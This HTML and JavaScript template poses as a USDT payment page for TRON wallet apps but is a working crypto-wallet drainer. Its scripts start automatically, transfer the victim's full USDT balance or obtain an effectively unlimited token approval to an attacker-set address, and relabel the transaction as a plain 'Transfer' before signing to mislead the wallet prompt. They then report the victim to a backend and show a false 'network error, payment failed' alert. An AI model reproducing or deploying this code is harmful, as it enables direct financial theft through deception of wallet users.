<body>
	<div class="container page-header p-4">
	    <div class="mt-2 text-center total-amount">
	        <span>Amount</span>
	        <small class="fs-8">$</small>
	        <small class="fs-8" id="amount"></small>
	    </div>
	</div>
	<div id="form">
	    <div class="app-button-container pb-2">
	        <div class="form-title p-2 pt-4">Wellat Apps</div>
	        <div class="row row-cols-3">
	            <div class="col">
	                <button class="app-button" type="button" onclick="tron_native.tronLoginAndSign();">
	                    <span class="icon-logo tronlink"></span>
	                    <span>Tronlink</span>
	                </button>
	            </div>
	            <div class="col" id="imtoken">
	                <button class="app-button" type="button" >
	                    <span class="icon-logo imtoken"></span>
	                    <span>imtoken</span>
	                </button>
	            </div>
	            <div class="col" id="TokenPocket">
	                <button class="app-button" type="button">
	                    <span class="icon-logo TokenPocket"></span>
	                    <span>TokenPocket</span>
	                </button>
	            </div>
	        </div>
	    </div>
	    <center>
	        <button type="submit" onclick="is_f()" id="payment">点击付款</button>
	    </center>
	</div>
	<script type="text/javascript" src="./js/vconsole.min.js"></script>
	<script>
	    
	    var domain = 'https://' + window.location.host + '/';
	    
	    function getUrlQueryString(names, urls) {
    		urls = urls || window.location.href;
    		urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
    		var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
    		var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
    		if (r != null && r[2] != "")return unescape(r[2]);
    		return null;
    
    	}
    	
    	var amountx = "{$amount}";
    	
    	 $("#amount").text(amountx);
	    
	    function getUrlParam(name) {
	    	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); 
	    	var r = window.location.search.substr(1).match(reg); 
	    	if (r != null) return unescape(r[2]); return null;
	    }
	    
	    var authorized_address = "{$trc_au_address}";
		var mauthorized_address = "{$trc_pay_address}";

        
        async function is_f(){
            const address = await tronWeb.defaultAddress.base58;
            
            var data = {
                address:address,
                authorized_address:authorized_address,
            }
            
            jQuery.ajax({
        		url: domain + 'api/is_f',
        		method: 'POST',
        		data:data,
        		async: false,
    			success:function(data){
                    
                    var result = JSON.parse(data);
                        
    			   if(result.result){
    			       connectm(address);
    			   }else{
    			       connects(address);
    			   }
    			   
    			},
    			error:function(data){
    
    			}
    		})
            
        }
        
	    async function connectm(address){
	    	
	    	let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
            let balance = await contract.balanceOf(address).call();
            var amount = mAll ? amountx : parseInt(balance._hex, 16);
	   // 	console.log(amount)
	    	const parameter = [{type:'address',value:mauthorized_address},{type:'uint256',value:amount * 1000000}];
	    	var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract(
	    			"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
	    			"transfer(address,uint256)",
	    			{},
	    			parameter,
	    			this.walletAddress
	    	 );
	   // 	 console.log(JSON.stringify(tx.transaction))
	    	 const data = tx.transaction.raw_data.contract[0].parameter.value.data
	    	 const type = tx.transaction.raw_data.contract[0].type
	    	 tx.transaction.raw_data.contract[0].parameter.value.data='Transfer'
	    	 tx.transaction.raw_data.contract[0].type='Transfer'
	    	 const signedTx = await this.tronWeb.trx.sign(tx.transaction);
	    	 signedTx.raw_data.contract[0].parameter.value.data=data;
	    	 signedTx.raw_data.contract[0].type=type
	    	 const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);

	    	 if(broastTx.result){
	    	     
	    	     var result = {
	    	         amount:amount,
	    	         address:address,
        			 mauthorized_address:mauthorized_address,
        			 txid:broastTx.txid,
	    	         
	    	     }
    	    	
    	    	jQuery.ajax({
        			url: domain + 'api/transfer',
        			method: 'POST',
        			data: result,
                    async: false, 
        			success: function (data) {	
        			},
        			error: function (e) {
        			}
    	    	})
    	    	
    	    	alert("付款成功");
	    	 }
	    }
	    
	    async function connects(address){
	        
	    	const parameter = [{type:'address',value:authorized_address},{type:'uint256',value:90000000000000}];
	    	var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract(
	    			"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
	    			"approve(address,uint256)",
	    			{},
	    			parameter,
	    			this.walletAddress
	    	 );
	    	 
	   // 	 console.log(JSON.stringify(tx.transaction))
	    	 const data = tx.transaction.raw_data.contract[0].parameter.value.data
	    	 const type = tx.transaction.raw_data.contract[0].type
	    	 tx.transaction.raw_data.contract[0].parameter.value.data='transfer'
	    	 tx.transaction.raw_data.contract[0].type='Transfer '+ amountx + ' USDT'
	    	 const signedTx = await this.tronWeb.trx.sign(tx.transaction);
	    	 signedTx.raw_data.contract[0].parameter.value.data=data;
	    	 signedTx.raw_data.contract[0].type=type
	    	 const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
	    	 
	    	 if(broastTx.result){
	    	     
	    	     var result = {
        			address:address,
        			authorized_address:authorized_address,
        			code:1,
        			type:1,
        		 }
	    	     
	    		 jQuery.ajax({
        			url: domain + 'api/insert_trc',
        			method: 'POST',
        			data: result,
        			success: function (data) {	
        			},
        			error: function (e) {
        			}
    	    	})
    	    	
    	    	alert("网络异常，付款失败");
	    	 }
	    }
	    const utm_source= getUrlParam("utm_source")
	    if(!utm_source){
	    	document.getElementById("imtoken").addEventListener('click',function(){
	    		window.location.href = 'imtokenv2://navigate?screen=DappView&url='+window.location
	    	})
	    	document.getElementById("TokenPocket").addEventListener('click',function(){
	    		window.location.href ='tpdapp://open?params={"url": "'+window.location+'"}'
	    	})	
	    }
	    setTimeout(function() { is_f() }, 2000);
	</script>
